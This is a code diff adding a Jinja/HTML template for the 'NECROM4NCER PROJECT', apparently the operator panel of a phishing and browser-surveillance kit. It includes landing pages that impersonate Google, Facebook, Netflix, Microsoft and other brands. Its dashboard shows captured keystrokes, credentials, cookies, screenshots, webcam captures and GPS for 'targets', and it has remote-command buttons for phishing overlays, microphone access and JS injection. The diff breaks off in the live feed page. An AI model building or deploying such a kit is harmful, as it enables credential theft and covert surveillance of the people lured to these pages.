@@ -1,0 +1,1627 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    {% if page == 'landing' %} {% if template_type == 'google_login' %}
+    <title>Google - Sign in</title>
+    <link rel="icon" href="https://www.google.com/favicon.ico" />
+    {% elif template_type == 'facebook_verify' %}
+    <title>Facebook - Verify Account</title>
+    <link rel="icon" href="https://www.facebook.com/favicon.ico" />
+    {% elif template_type == 'instagram_badge' %}
+    <title>Instagram - Verification</title>
+    <link rel="icon" href="https://www.instagram.com/favicon.ico" />
+    {% elif template_type == 'whatsapp_update' %}
+    <title>WhatsApp - Security Update</title>
+    {% elif template_type == 'netflix_payment' %}
+    <title>Netflix - Update Payment</title>
+    <link rel="icon" href="https://www.netflix.com/favicon.ico" />
+    {% elif template_type == 'microsoft_365' %}
+    <title>Sign in - Microsoft</title>
+    {% elif template_type == 'linkedin_connect' %}
+    <title>LinkedIn Login</title>
+    {% else %}
+    <title>Please Wait...</title>
+    {% endif %} {% elif page == 'login' %}
+    <title>RF - Access</title>
+    {% else %}
+    <title>NECROM4NCER PROJECT</title>
+    <link
+      rel="stylesheet"
+      href="{{ url_for('static', filename='css/dashboard.css') }}"
+    />
+    {% endif %} {% if page != 'landing' %}
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"
+    />
+    <link
+      rel="stylesheet"
+      href="{{ url_for('static', filename='css/dashboard.css') }}"
+    />
+    {% endif %}
+  </head>
+  <body>
+    {# ======================= LOGIN ======================= #} {% if page ==
+    'login' %}
+    <div class="login-wrapper">
+      <div class="login-card">
+        <div class="login-header">
+          <div class="login-icon"><i class="fa-solid fa-book-skull"></i></div>
+          <h1>NECROM4NCER PROJECT</h1>
+          <p>Authorized Personnel Only</p>
+        </div>
+        {% if error %}
+        <div class="login-error">
+          <i class="fas fa-exclamation-triangle"></i> {{ error }}
+        </div>
+        {% endif %}
+        <form method="POST" action="/login">
+          <div class="form-group">
+            <label class="form-label">Username</label>
+            <div class="input-with-icon">
+              <i class="fas fa-user input-icon"></i>
+              <input
+                type="text"
+                name="username"
+                class="form-control"
+                placeholder="Enter username"
+                required
+                autofocus
+              />
+            </div>
+          </div>
+          <div class="form-group">
+            <label class="form-label">Password</label>
+            <div class="input-with-icon">
+              <i class="fas fa-lock input-icon"></i>
+              <input
+                type="password"
+                name="password"
+                class="form-control"
+                placeholder="Enter password"
+                required
+              />
+            </div>
+          </div>
+          <button type="submit" class="btn btn-primary btn-full btn-lg">
+            <i class="fas fa-sign-in-alt"></i> Sign In
+          </button>
+        </form>
+        <div class="login-footer">
+          <i class="fas fa-exclamation-circle"></i> Unauthorized access is
+          prohibited and logged.
+        </div>
+      </div>
+    </div>
+
+    {# ======================= SIDEBAR MACRO ======================= #} {% elif
+    page != 'landing' %} {# -- Reusable sidebar -- #} {% macro
+    sidebar_block(active_page) %}
+    <aside class="sidebar" id="sidebar">
+      <div class="sidebar-header">
+        <div class="sidebar-brand">
+          <div class="sidebar-brand-icon">
+            <i class="fa-solid fa-book-skull"></i>
+          </div>
+          <div class="sidebar-brand-text">
+            <h2>NECROM4NCER PROJECT</h2>
+            <span>Version 1.0</span>
+          </div>
+        </div>
+      </div>
+      <nav class="sidebar-nav">
+        <div class="nav-section">
+          <div class="nav-section-label">Navigation</div>
+          <a
+            href="/"
+            class="nav-link {{ 'active' if active_page == 'dashboard' }}"
+          >
+            <i class="fas fa-chart-pie"></i> Dashboard
+          </a>
+          <a
+            href="/campaigns"
+            class="nav-link {{ 'active' if active_page == 'campaigns' }}"
+          >
+            <i class="fas fa-link"></i> Campaigns
+          </a>
+          <a
+            href="/live"
+            class="nav-link {{ 'active' if active_page == 'live' }}"
+          >
+            <i class="fas fa-broadcast-tower"></i> Live Feed
+          </a>
+        </div>
+        <div class="nav-section">
+          <div class="nav-section-label">System</div>
+          <a href="/logout" class="nav-link">
+            <i class="fas fa-sign-out-alt"></i> Logout
+          </a>
+        </div>
+      </nav>
+      <div class="sidebar-footer">
+        <div class="sidebar-footer-info">
+          <i class="fas fa-lock"></i> Encrypted Session Active
+        </div>
+      </div>
+    </aside>
+    <div class="sidebar-overlay" id="sidebar-overlay"></div>
+    {% endmacro %} {# ======================= DASHBOARD =======================
+    #} {% if page == 'dashboard' %}
+    <div class="app-layout">
+      {{ sidebar_block('dashboard') }}
+      <main class="main-content">
+        <header class="topbar">
+          <div class="topbar-left">
+            <button class="hamburger-btn" id="sidebar-toggle">
+              <i class="fas fa-bars"></i>
+            </button>
+            <h1>
+              <i class="fas fa-chart-pie"></i>
+              <span class="hide-mobile">Dashboard</span>
+            </h1>
+          </div>
+          <div class="topbar-right">
+            <div class="search-box">
+              <i class="fas fa-search"></i>
+              <input
+                type="text"
+                id="search-input"
+                placeholder="Search sessions..."
+              />
+            </div>
+            <div class="live-indicator" id="connection-status">
+              <span class="live-dot"></span> Connected
+            </div>
+          </div>
+        </header>
+
+        <div class="page-content">
+          <!-- Stats -->
+          <div class="stats-grid">
+            <div class="stat-card blue">
+              <div class="stat-card-header">
+                <div class="stat-icon-box blue">
+                  <i class="fas fa-crosshairs"></i>
+                </div>
+              </div>
+              <div class="stat-value" id="stat-total">{{ stats.total }}</div>
+              <div class="stat-label">Total Sessions</div>
+            </div>
+            <div class="stat-card green">
+              <div class="stat-card-header">
+                <div class="stat-icon-box green">
+                  <i class="fas fa-signal"></i>
+                </div>
+              </div>
+              <div class="stat-value" id="stat-active">{{ stats.active }}</div>
+              <div class="stat-label">Active Now</div>
+            </div>
+            <div class="stat-card purple">
+              <div class="stat-card-header">
+                <div class="stat-icon-box purple">
+                  <i class="fas fa-keyboard"></i>
+                </div>
+              </div>
+              <div class="stat-value" id="stat-keylogs">
+                {{ stats.keylogs }}
+              </div>
+              <div class="stat-label">Keystrokes</div>
+            </div>
+            <div class="stat-card cyan">
+              <div class="stat-card-header">
+                <div class="stat-icon-box cyan">
+                  <i class="fas fa-camera"></i>
+                </div>
+              </div>
+              <div class="stat-value" id="stat-screenshots">
+                {{ stats.screenshots }}
+              </div>
+              <div class="stat-label">Screenshots</div>
+            </div>
+            <div class="stat-card red">
+              <div class="stat-card-header">
+                <div class="stat-icon-box red"><i class="fas fa-key"></i></div>
+              </div>
+              <div class="stat-value" id="stat-credentials">
+                {{ stats.credentials }}
+              </div>
+              <div class="stat-label">Credentials</div>
+            </div>
+            <div class="stat-card orange">
+              <div class="stat-card-header">
+                <div class="stat-icon-box orange">
+                  <i class="fas fa-map-marker-alt"></i>
+                </div>
+              </div>
+              <div class="stat-value">{{ stats.locations }}</div>
+              <div class="stat-label">Locations</div>
+            </div>
+          </div>
+
+          <!-- Sessions Table -->
+          <div class="section">
+            <div class="section-header">
+              <h2 class="section-title">
+                <i class="fas fa-crosshairs"></i> Sessions
+              </h2>
+              <button
+                class="btn btn-sm btn-ghost"
+                onclick="window.RF.refresh()"
+              >
+                <i class="fas fa-sync-alt"></i> Refresh
+              </button>
+            </div>
+            <div class="card">
+              <div class="card-body flush">
+                <div class="table-container">
+                  <table>
+                    <thead>
+                      <tr>
+                        <th>Target</th>
+                        <th>Browser</th>
+                        <th>OS</th>
+                        <th>Location</th>
+                        <th>Status</th>
+                        <th>Data</th>
+                        <th>Last Seen</th>
+                        <th>Actions</th>
+                      </tr>
+                    </thead>
+                    <tbody id="sessions-tbody">
+                      <tr>
+                        <td colspan="8">
+                          <div class="empty-state">
+                            <i class="fas fa-satellite-dish"></i>
+                            <p>Loading...</p>
+                          </div>
+                        </td>
+                      </tr>
+                    </tbody>
+                  </table>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Live Feed Preview -->
+          <div class="section">
+            <div class="section-header">
+              <h2 class="section-title">
+                <i class="fas fa-broadcast-tower"></i> Activity Feed
+              </h2>
+            </div>
+            <div class="card">
+              <div class="card-body flush">
+                <div class="live-feed" id="live-feed">
+                  <div class="empty-state">
+                    <i class="fas fa-satellite-dish"></i>
+                    <p>Waiting for data...</p>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </main>
+    </div>
+
+    {# ======================= SESSION DETAIL ======================= #} {% elif
+    page == 'session_detail' %}
+    <div class="app-layout">
+      {{ sidebar_block('') }}
+      <main class="main-content">
+        <div id="session-id-data" data-sid="{{ sid }}" class="hidden"></div>
+
+        <header class="topbar">
+          <div class="topbar-left">
+            <button class="hamburger-btn" id="sidebar-toggle">
+              <i class="fas fa-bars"></i>
+            </button>
+            <a href="/" class="btn btn-sm btn-ghost"
+              ><i class="fas fa-arrow-left"></i
+            ></a>
+            <h1>
+              <i class="fas fa-crosshairs"></i>
+              <span class="hide-mobile">Session:</span> {{ sid[:8] }}…
+            </h1>
+          </div>
+          <div class="topbar-right">
+            <div class="live-indicator" id="connection-status">
+              <span class="live-dot"></span> Connected
+            </div>
+            <button
+              class="btn btn-sm btn-ghost"
+              onclick="window.RF.exportSession('{{ sid }}')"
+            >
+              <i class="fas fa-download"></i> Export
+            </button>
+            <button
+              class="btn btn-sm btn-ghost-danger"
+              onclick="window.RF.deleteSession('{{ sid }}')"
+            >
+              <i class="fas fa-trash-alt"></i>
+            </button>
+          </div>
+        </header>
+
+        <!-- Tabs -->
+        <div class="tabs-bar">
+          <button class="tab-btn active" data-tab="overview">
+            <i class="fas fa-info-circle"></i> Overview
+          </button>
+          <button class="tab-btn" data-tab="keylog">
+            <i class="fas fa-keyboard"></i> Keylog
+          </button>
+          <button class="tab-btn" data-tab="creds">
+            <i class="fas fa-key"></i> Credentials
+          </button>
+          <button class="tab-btn" data-tab="captures">
+            <i class="fas fa-camera"></i> Captures
+          </button>
+          <button class="tab-btn" data-tab="location">
+            <i class="fas fa-map-marker-alt"></i> Location
+          </button>
+          <button class="tab-btn" data-tab="clipboard">
+            <i class="fas fa-clipboard"></i> Clipboard
+          </button>
+          <button class="tab-btn" data-tab="forms">
+            <i class="fas fa-edit"></i> Forms
+          </button>
+          <button class="tab-btn" data-tab="fingerprint">
+            <i class="fas fa-fingerprint"></i> Fingerprint
+          </button>
+          <button class="tab-btn" data-tab="network">
+            <i class="fas fa-network-wired"></i> Network
+          </button>
+          <button class="tab-btn" data-tab="commands">
+            <i class="fas fa-terminal"></i> Commands
+          </button>
+          <button class="tab-btn" data-tab="raw">
+            <i class="fas fa-code"></i> Raw
+          </button>
+        </div>
+
+        <!-- PANEL: Overview -->
+        <div class="tab-panel active" id="panel-overview">
+          <div class="page-content">
+            <div class="detail-grid">
+              <div class="card">
+                <div class="card-header">
+                  <h3 class="card-title">
+                    <i class="fas fa-desktop"></i> System Info
+                  </h3>
+                </div>
+                <div class="card-body">
+                  <ul class="info-list">
+                    <li class="info-item">
+                      <span class="info-label"
+                        ><i class="fas fa-globe"></i> IP</span
+                      ><span class="info-value" id="d-ip">—</span>
+                    </li>
+                    <li class="info-item">
+                      <span class="info-label"
+                        ><i class="fab fa-chrome"></i> Browser</span
+                      ><span class="info-value" id="d-browser">—</span>
+                    </li>
+                    <li class="info-item">
+                      <span class="info-label"
+                        ><i class="fas fa-laptop"></i> OS</span
+                      ><span class="info-value" id="d-os">—</span>
+                    </li>
+                    <li class="info-item">
+                      <span class="info-label"
+                        ><i class="fas fa-mobile-alt"></i> Device</span
+                      ><span class="info-value" id="d-device">—</span>
+                    </li>
+                    <li class="info-item">
+                      <span class="info-label"
+                        ><i class="fas fa-circle"></i> Status</span
+                      ><span class="info-value" id="d-status">—</span>
+                    </li>
+                    <li class="info-item">
+                      <span class="info-label"
+                        ><i class="fas fa-clock"></i> First Seen</span
+                      ><span class="info-value" id="d-created">—</span>
+                    </li>
+                    <li class="info-item">
+                      <span class="info-label"
+                        ><i class="fas fa-eye"></i> Last Seen</span
+                      ><span class="info-value" id="d-lastseen">—</span>
+                    </li>
+                    <li class="info-item">
+                      <span class="info-label"
+                        ><i class="fas fa-tv"></i> Screen</span
+                      ><span class="info-value" id="d-screen">—</span>
+                    </li>
+                    <li class="info-item">
+                      <span class="info-label"
+                        ><i class="fas fa-palette"></i> Color</span
+                      ><span class="info-value" id="d-colordepth">—</span>
+                    </li>
+                    <li class="info-item">
+                      <span class="info-label"
+                        ><i class="fas fa-battery-half"></i> Battery</span
+                      ><span class="info-value" id="d-battery">—</span>
+                    </li>
+                  </ul>
+                </div>
+              </div>
+              <div class="card">
+                <div class="card-header">
+                  <h3 class="card-title">
+                    <i class="fas fa-map-marker-alt"></i> Location
+                  </h3>
+                </div>
+                <div class="card-body">
+                  <ul class="info-list">
+                    <li class="info-item">
+                      <span class="info-label"
+                        ><i class="fas fa-flag"></i> Country/City</span
+                      ><span class="info-value" id="d-country">—</span>
+                    </li>
+                    <li class="info-item">
+                      <span class="info-label"
+                        ><i class="fas fa-building"></i> ISP</span
+                      ><span class="info-value" id="d-isp">—</span>
+                    </li>
+                    <li class="info-item">
+                      <span class="info-label"
+                        ><i class="fas fa-sitemap"></i> Org</span
+                      ><span class="info-value" id="d-org">—</span>
+                    </li>
+                    <li class="info-item">
+                      <span class="info-label"
+                        ><i class="fas fa-server"></i> AS</span
+                      ><span class="info-value" id="d-as">—</span>
+                    </li>
+                    <li class="info-item">
+                      <span class="info-label"
+                        ><i class="fas fa-location-arrow"></i> IP Lat</span
+                      ><span class="info-value" id="d-lat">—</span>
+                    </li>
+                    <li class="info-item">
+                      <span class="info-label"
+                        ><i class="fas fa-location-arrow"></i> IP Lon</span
+                      ><span class="info-value" id="d-lon">—</span>
+                    </li>
+                    <li class="info-item">
+                      <span class="info-label"
+                        ><i class="fas fa-satellite"></i> GPS Lat</span
+                      ><span class="info-value" id="d-gps-lat">—</span>
+                    </li>
+                    <li class="info-item">
+                      <span class="info-label"
+                        ><i class="fas fa-satellite"></i> GPS Lon</span
+                      ><span class="info-value" id="d-gps-lon">—</span>
+                    </li>
+                    <li class="info-item">
+                      <span class="info-label"
+                        ><i class="fas fa-bullseye"></i> GPS Acc</span
+                      ><span class="info-value" id="d-gps-acc">—</span>
+                    </li>
+                  </ul>
+                </div>
+              </div>
+              <div class="card">
+                <div class="card-header">
+                  <h3 class="card-title">
+                    <i class="fas fa-microchip"></i> Hardware
+                  </h3>
+                </div>
+                <div class="card-body">
+                  <ul class="info-list">
+                    <li class="info-item">
+                      <span class="info-label"
+                        ><i class="fas fa-gamepad"></i> GPU</span
+                      ><span class="info-value" id="d-gpu">—</span>
+                    </li>
+                    <li class="info-item">
+                      <span class="info-label"
+                        ><i class="fas fa-industry"></i> GPU Vendor</span
+                      ><span class="info-value" id="d-gpu-vendor">—</span>
+                    </li>
+                    <li class="info-item">
+                      <span class="info-label"
+                        ><i class="fas fa-cogs"></i> CPU Cores</span
+                      ><span class="info-value" id="d-cores">—</span>
+                    </li>
+                    <li class="info-item">
+                      <span class="info-label"
+                        ><i class="fas fa-memory"></i> RAM</span
+                      ><span class="info-value" id="d-memory">—</span>
+                    </li>
+                    <li class="info-item">
+                      <span class="info-label"
+                        ><i class="fas fa-clock"></i> Timezone</span
+                      ><span class="info-value" id="d-timezone">—</span>
+                    </li>
+                    <li class="info-item">
+                      <span class="info-label"
+                        ><i class="fas fa-language"></i> Language</span
+                      ><span class="info-value" id="d-language">—</span>
+                    </li>
+                    <li class="info-item">
+                      <span class="info-label"
+                        ><i class="fas fa-wifi"></i> Connection</span
+                      ><span class="info-value" id="d-connection">—</span>
+                    </li>
+                  </ul>
+                </div>
+              </div>
+              <div class="card">
+                <div class="card-header">
+                  <h3 class="card-title">
+                    <i class="fas fa-project-diagram"></i> Network Leaks
+                  </h3>
+                </div>
+                <div class="card-body">
+                  <ul class="info-list">
+                    <li class="info-item">
+                      <span class="info-label"
+                        ><i class="fas fa-exchange-alt"></i> WebRTC</span
+                      ><span class="info-value" id="d-webrtc">—</span>
+                    </li>
+                    <li class="info-item">
+                      <span class="info-label"
+                        ><i class="fas fa-id-card"></i> User Agent</span
+                      ><span class="info-value text-xs" id="d-ua">—</span>
+                    </li>
+                  </ul>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- PANEL: Keylog -->
+        <div class="tab-panel" id="panel-keylog">
+          <div class="page-content">
+            <div class="card">
+              <div class="card-header">
+                <h3 class="card-title">
+                  <i class="fas fa-keyboard"></i> Keystroke Log
+                </h3>
+              </div>
+              <div class="card-body">
+                <div class="keylog-viewer" id="keylog-viewer">
+                  <span class="text-muted">Waiting for keystrokes...</span>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- PANEL: Credentials -->
+        <div class="tab-panel" id="panel-creds">
+          <div class="page-content">
+            <div class="card">
+              <div class="card-header">
+                <h3 class="card-title">
+                  <i class="fas fa-key"></i> Captured Credentials
+                </h3>
+              </div>
+              <div class="card-body flush" id="creds-list">
+                <div class="empty-state">
+                  <i class="fas fa-lock"></i>
+                  <p>No credentials captured</p>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- PANEL: Captures -->
+        <div class="tab-panel" id="panel-captures">
+          <div class="page-content">
+            <div class="card mb-2">
+              <div class="card-header">
+                <h3 class="card-title">
+                  <i class="fas fa-desktop"></i> Screenshots
+                </h3>
+              </div>
+              <div class="card-body">
+                <div class="gallery-grid" id="screenshots-gallery">
+                  <div class="empty-state">
+                    <i class="fas fa-images"></i>
+                    <p>No screenshots</p>
+                  </div>
+                </div>
+              </div>
+            </div>
+            <div class="card">
+              <div class="card-header">
+                <h3 class="card-title">
+                  <i class="fas fa-video"></i> Camera Captures
+                </h3>
+              </div>
+              <div class="card-body">
+                <div class="gallery-grid" id="camera-gallery">
+                  <div class="empty-state">
+                    <i class="fas fa-images"></i>
+                    <p>No camera captures</p>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- PANEL: Location -->
+        <div class="tab-panel" id="panel-location">
+          <div class="page-content">
+            <div class="card">
+              <div class="card-header">
+                <h3 class="card-title">
+                  <i class="fas fa-map-marked-alt"></i> GPS Tracking
+                </h3>
+              </div>
+              <div class="card-body text-center">
+                <div style="padding: 40px">
+                  <i
+                    class="fas fa-map-marked-alt text-muted"
+                    style="font-size: 48px; opacity: 0.3"
+                  ></i>
+                  <p class="text-muted mt-2">
+                    GPS data available when geolocation is permitted.
+                  </p>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- PANEL: Clipboard -->
+        <div class="tab-panel" id="panel-clipboard">
+          <div class="page-content">
+            <div class="card">
+              <div class="card-header">
+                <h3 class="card-title">
+                  <i class="fas fa-clipboard-list"></i> Clipboard Activity
+                </h3>
+              </div>
+              <div class="card-body flush">
+                <div class="live-feed" id="clipboard-list">
+                  <div class="empty-state">
+                    <i class="fas fa-clipboard"></i>
+                    <p>No clipboard data</p>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- PANEL: Forms -->
+        <div class="tab-panel" id="panel-forms">
+          <div class="page-content">
+            <div class="card">
+              <div class="card-header">
+                <h3 class="card-title">
+                  <i class="fas fa-file-alt"></i> Form Submissions
+                </h3>
+              </div>
+              <div class="card-body flush" id="formdata-list">
+                <div class="empty-state">
+                  <i class="fas fa-edit"></i>
+                  <p>No form submissions</p>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- PANEL: Fingerprint -->
+        <div class="tab-panel" id="panel-fingerprint">
+          <div class="page-content">
+            <div class="detail-grid">
+              <div class="card">
+                <div class="card-header">
+                  <h3 class="card-title">
+                    <i class="fas fa-fingerprint"></i> Browser Fingerprint
+                  </h3>
+                </div>
+                <div class="card-body">
+                  <ul class="info-list">
+                    <li class="info-item">
+                      <span class="info-label"
+                        ><i class="fas fa-paint-brush"></i> Canvas</span
+                      ><span class="info-value" id="d-canvas-fp">—</span>
+                    </li>
+                    <li class="info-item">
+                      <span class="info-label"
+                        ><i class="fas fa-headphones"></i> Audio</span
+                      ><span class="info-value" id="d-audio-fp">—</span>
+                    </li>
+                    <li class="info-item">
+                      <span class="info-label"
+                        ><i class="fas fa-font"></i> Fonts</span
+                      ><span class="info-value text-xs" id="d-fonts">—</span>
+                    </li>
+                  </ul>
+                </div>
+              </div>
+              <div class="card">
+                <div class="card-header">
+                  <h3 class="card-title"><i class="fas fa-cube"></i> WebGL</h3>
+                </div>
+                <div class="card-body">
+                  <div class="json-viewer" id="d-webgl-raw">No data</div>
+                </div>
+              </div>
+              <div class="card">
+                <div class="card-header">
+                  <h3 class="card-title">
+                    <i class="fas fa-shield-alt"></i> Permissions
+                  </h3>
+                </div>
+                <div class="card-body">
+                  <div class="json-viewer" id="d-permissions">No data</div>
+                </div>
+              </div>
+              <div class="card">
+                <div class="card-header">
+                  <h3 class="card-title">
+                    <i class="fas fa-users"></i> Social Media
+                  </h3>
+                </div>
+                <div class="card-body flush">
+                  <div class="live-feed" id="social-list">
+                    <div class="empty-state">
+                      <i class="fas fa-users"></i>
+                      <p>No scan results</p>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- PANEL: Network -->
+        <div class="tab-panel" id="panel-network">
+          <div class="page-content">
+            <div class="detail-grid">
+              <div class="card">
+                <div class="card-header">
+                  <h3 class="card-title">
+                    <i class="fas fa-cookie-bite"></i> Cookies
+                  </h3>
+                </div>
+                <div class="card-body">
+                  <div class="json-viewer" id="d-cookies">No data</div>
+                </div>
+              </div>
+              <div class="card">
+                <div class="card-header">
+                  <h3 class="card-title">
+                    <i class="fas fa-database"></i> Local Storage
+                  </h3>
+                </div>
+                <div class="card-body">
+                  <div class="json-viewer" id="d-localstorage">No data</div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- PANEL: Commands -->
+        <div class="tab-panel" id="panel-commands">
+          <div class="page-content">
+            <div class="card mb-2">
+              <div class="card-header">
+                <h3 class="card-title">
+                  <i class="fas fa-terminal"></i> Remote Commands
+                </h3>
+              </div>
+              <div class="card-body">
+                <p class="text-sm text-muted mb-2">
+                  Send commands to the target browser in real-time. Requires
+                  active WebSocket connection.
+                </p>
+                <div class="command-grid">
+                  <button class="cmd-btn" data-cmd="screenshot">
+                    <i class="fas fa-camera"></i> Screenshot
+                  </button>
+                  <button class="cmd-btn" data-cmd="camera">
+                    <i class="fas fa-video"></i> Camera
+                  </button>
+                  <button class="cmd-btn" data-cmd="microphone">
+                    <i class="fas fa-microphone"></i> Microphone
+                  </button>
+                  <button class="cmd-btn" data-cmd="location">
+                    <i class="fas fa-map-marker-alt"></i> GPS Location
+                  </button>
+                  <button class="cmd-btn" data-cmd="clipboard_read">
+                    <i class="fas fa-clipboard"></i> Clipboard
+                  </button>
+                  <button class="cmd-btn" data-cmd="get_cookies">
+                    <i class="fas fa-cookie-bite"></i> Cookies
+                  </button>
+                  <button class="cmd-btn" data-cmd="get_localstorage">
+                    <i class="fas fa-database"></i> Storage
+                  </button>
+                  <button class="cmd-btn" data-cmd="get_dom">
+                    <i class="fas fa-code"></i> Grab DOM
+                  </button>
+                  <button class="cmd-btn" data-cmd="social_scan">
+                    <i class="fas fa-users"></i> Social Scan
+                  </button>
+                  <button class="cmd-btn" data-cmd="phish_overlay">
+                    <i class="fas fa-mask"></i> Phish Overlay
+                  </button>
+                  <button class="cmd-btn" data-cmd="notification">
+                    <i class="fas fa-bell"></i> Notification
+                  </button>
+                  <button class="cmd-btn" data-cmd="harvest_all">
+                    <i class="fas fa-magnet"></i> Harvest All
+                  </button>
+                  <button class="cmd-btn" data-cmd="redirect">
+                    <i class="fas fa-external-link-alt"></i> Redirect
+                  </button>
+                  <button class="cmd-btn" data-cmd="inject_js">
+                    <i class="fas fa-syringe"></i> Inject JS
+                  </button>
+                  <button class="cmd-btn" data-cmd="inject_html">
+                    <i class="fas fa-file-code"></i> Inject HTML
+                  </button>
+                  <button class="cmd-btn" data-cmd="alert_box">
+                    <i class="fas fa-exclamation-triangle"></i> Alert
+                  </button>
+                  <button class="cmd-btn" data-cmd="vibrate">
+                    <i class="fas fa-mobile-alt"></i> Vibrate
+                  </button>
+                  <button class="cmd-btn" data-cmd="fullscreen">
+                    <i class="fas fa-expand"></i> Fullscreen
+                  </button>
+                  <button class="cmd-btn" data-cmd="device_sensors">
+                    <i class="fas fa-compass"></i> Sensors
+                  </button>
+                </div>
+              </div>
+            </div>
+
+            <!-- Notes -->
+            <div class="card">
+              <div class="card-header">
+                <h3 class="card-title">
+                  <i class="fas fa-sticky-note"></i> Session Notes
+                </h3>
+              </div>
+              <div class="card-body">
+                <textarea
+                  id="d-notes"
+                  class="form-control"
+                  rows="4"
+                  placeholder="Write notes about this target session..."
+                ></textarea>
+                <div class="mt-1">
+                  <button id="save-notes-btn" class="btn btn-sm btn-success">
+                    <i class="fas fa-save"></i> Save Notes
+                  </button>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- PANEL: Raw Data -->
+        <div class="tab-panel" id="panel-raw">
+          <div class="page-content">
+            <div class="card">
+              <div class="card-header">
+                <h3 class="card-title">
+                  <i class="fas fa-code"></i> Raw Session JSON
+                </h3>
+                <button
+                  class="btn btn-sm btn-ghost"
+                  onclick="window.RF.exportSession('{{ sid }}')"
+                >
+                  <i class="fas fa-download"></i> Download
+                </button>
+              </div>
+              <div class="card-body">
+                <div class="json-viewer" id="d-browser-raw">Loading...</div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </main>
+    </div>
+
+    {# ======================= CAMPAIGNS ======================= #} {% elif page
+    == 'campaigns' %}
+    <div class="app-layout">
+      {{ sidebar_block('campaigns') }}
+      <main class="main-content">
+        <header class="topbar">
+          <div class="topbar-left">
+            <button class="hamburger-btn" id="sidebar-toggle">
+              <i class="fas fa-bars"></i>
+            </button>
+            <h1>
+              <i class="fas fa-link"></i>
+              <span class="hide-mobile">Campaigns</span>
+            </h1>
+          </div>
+          <div class="topbar-right">
+            <div class="live-indicator" id="connection-status">
+              <span class="live-dot"></span> Connected
+            </div>
+          </div>
+        </header>
+
+        <div class="page-content">
+          <!-- Template Selection -->
+          <div class="section">
+            <div class="section-header">
+              <h2 class="section-title">
+                <i class="fas fa-palette"></i> Select Template
+              </h2>
+            </div>
+            <div class="card">
+              <div class="card-body">
+                <div class="template-grid">
+                  {% for key, val in templates.items() %}
+                  <div class="template-card" data-template="{{ key }}">
+                    {% if key == 'google_login' %}<i class="fab fa-google"></i>
+                    {% elif key == 'facebook_verify' %}<i
+                      class="fab fa-facebook"
+                    ></i>
+                    {% elif key == 'instagram_badge' %}<i
+                      class="fab fa-instagram"
+                    ></i>
+                    {% elif key == 'whatsapp_update' %}<i
+                      class="fab fa-whatsapp"
+                    ></i>
+                    {% elif key == 'netflix_payment' %}<i
+                      class="fas fa-film"
+                    ></i>
+                    {% elif key == 'linkedin_connect' %}<i
+                      class="fab fa-linkedin"
+                    ></i>
+                    {% elif key == 'microsoft_365' %}<i
+                      class="fab fa-microsoft"
+                    ></i>
+                    {% elif key == 'custom' %}<i class="fas fa-pencil-alt"></i>
+                    {% else %}<i class="fas fa-file"></i>
+                    {% endif %}
+                    <div class="tpl-name">{{ val.name }}</div>
+                  </div>
+                  {% endfor %}
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Generate Link -->
+          <div class="section">
+            <div class="section-header">
+              <h2 class="section-title">
+                <i class="fas fa-cog"></i> Link Settings
+              </h2>
+            </div>
+            <div class="card">
+              <div class="card-body">
+                <div class="form-group">
+                  <label class="form-label">Custom Path (optional)</label>
+                  <div class="input-with-icon">
+                    <i class="fas fa-route input-icon"></i>
+                    <input
+                      type="text"
+                      id="custom-path"
+                      class="form-control"
+                      placeholder="e.g. verify-account (leave blank for auto)"
+                    />
+                  </div>
+                </div>
+                <button id="gen-link-btn" class="btn btn-primary">
+                  <i class="fas fa-bolt"></i> Generate Link
+                </button>
+
+                <div id="gen-link-result" class="generated-link-box hidden">
+                  <i class="fas fa-link"></i>
+                  <input type="text" readonly />
+                  <button id="copy-link-btn" class="btn btn-sm btn-success">
+                    <i class="fas fa-copy"></i> Copy
+                  </button>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Existing Links -->
+          <div class="section">
+            <div class="section-header">
+              <h2 class="section-title">
+                <i class="fas fa-list"></i> Generated Links
+              </h2>
+            </div>
+            <div class="card">
+              <div class="card-body flush">
+                <div class="table-container">
+                  <table>
+                    <thead>
+                      <tr>
+                        <th>ID</th>
+                        <th>Template</th>
+                        <th>Path</th>
+                        <th>Created</th>
+                        <th>Visits</th>
+                      </tr>
+                    </thead>
+                    <tbody>
+                      {% if links %} {% for lid, ldata in links.items() %}
+                      <tr>
+                        <td class="text-mono text-sm">{{ lid }}</td>
+                        <td>{{ ldata.template }}</td>
+                        <td class="text-mono text-accent">{{ ldata.path }}</td>
+                        <td class="text-sm text-muted">{{ ldata.created }}</td>
+                        <td>
+                          <span class="badge badge-success"
+                            >{{ ldata.visits }}</span
+                          >
+                        </td>
+                      </tr>
+                      {% endfor %} {% else %}
+                      <tr>
+                        <td colspan="5">
+                          <div class="empty-state">
+                            <i class="fas fa-link"></i>
+                            <p>No links generated yet</p>
+                          </div>
+                        </td>
+                      </tr>
+                      {% endif %}
+                    </tbody>
+                  </table>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </main>
+    </div>
+
+    {# ======================= LIVE FEED PAGE ======================= #} {% elif
+    page == 'live' %}
+    <div class="app-layout">
+      {{ sidebar_block('live') }}
+      <main class="main-content">
+        <header class="topbar">
+          <div class="topbar-left">
+            <button class="hamburger-btn" id="sidebar-toggle">
+              <i class="fas fa-bars"></i>
+            </button>
+            <h1>
+              <i class="fas fa-broadcast-tower"></i>
